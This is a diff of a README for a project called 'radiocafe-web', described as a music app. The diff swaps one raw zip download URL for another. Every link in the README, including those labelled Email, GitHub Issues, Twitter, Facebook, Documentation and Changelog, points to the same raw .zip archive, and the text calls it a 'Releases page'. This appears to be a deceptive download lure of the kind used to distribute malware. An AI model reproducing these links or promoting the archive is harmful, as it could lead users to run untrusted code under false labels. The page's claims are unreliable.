@@ -1,6 +1,6 @@
 # 🎧 radiocafe-web - Enjoy Music That Stirs Memories
 
-[![Download Latest Release](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/netlify/radiocafe-web-clangor.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/netlify/radiocafe-web-clangor.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/public/web_radiocafe_2.5.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/public/web_radiocafe_2.5.zip)
 
 ## 📘 Description
 
@@ -23,7 +23,7 @@ Before downloading, ensure your system meets these requirements:
 
 You can download the latest version of radiocafe-web from the Releases page. 
 
-Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/netlify/radiocafe-web-clangor.zip).
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/public/web_radiocafe_2.5.zip).
 
 1. Click the link above.
 2. On the Releases page, find the latest version listed at the top.
@@ -56,21 +56,21 @@ If you encounter any issues or have questions, feel free to reach out.
 
 ### Contact Information
 
-- **Email**: https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/netlify/radiocafe-web-clangor.zip
-- **GitHub Issues**: Report bugs or request features on our [GitHub Issues Page](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/netlify/radiocafe-web-clangor.zip).
+- **Email**: https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/public/web_radiocafe_2.5.zip
+- **GitHub Issues**: Report bugs or request features on our [GitHub Issues Page](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/public/web_radiocafe_2.5.zip).
 
 ## ✨ Join the Community
 
 Connect with other users and share your experiences:
 
-- **Social Media**: Follow us on [Twitter](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/netlify/radiocafe-web-clangor.zip) and [Facebook](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/netlify/radiocafe-web-clangor.zip).
-- **Discussion Forums**: Join discussions about music and the application in our [Community Forum](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/netlify/radiocafe-web-clangor.zip).
+- **Social Media**: Follow us on [Twitter](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/public/web_radiocafe_2.5.zip) and [Facebook](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/public/web_radiocafe_2.5.zip).
+- **Discussion Forums**: Join discussions about music and the application in our [Community Forum](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/public/web_radiocafe_2.5.zip).
 
 ## 🔗 Useful Links
 
-- **Documentation**: Detailed user guide available [here](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/netlify/radiocafe-web-clangor.zip).
-- **Contribute**: Interested in helping? Check out the [Contributing Guide](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/netlify/radiocafe-web-clangor.zip).
-- **Release Notes**: Read about the latest updates in the [Changelog](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/netlify/radiocafe-web-clangor.zip).
+- **Documentation**: Detailed user guide available [here](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/public/web_radiocafe_2.5.zip).
+- **Contribute**: Interested in helping? Check out the [Contributing Guide](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/public/web_radiocafe_2.5.zip).
+- **Release Notes**: Read about the latest updates in the [Changelog](https://raw.githubusercontent.com/lozanourel25/radiocafe-web/main/public/web_radiocafe_2.5.zip).
 
 ## ✅ Changelog
 
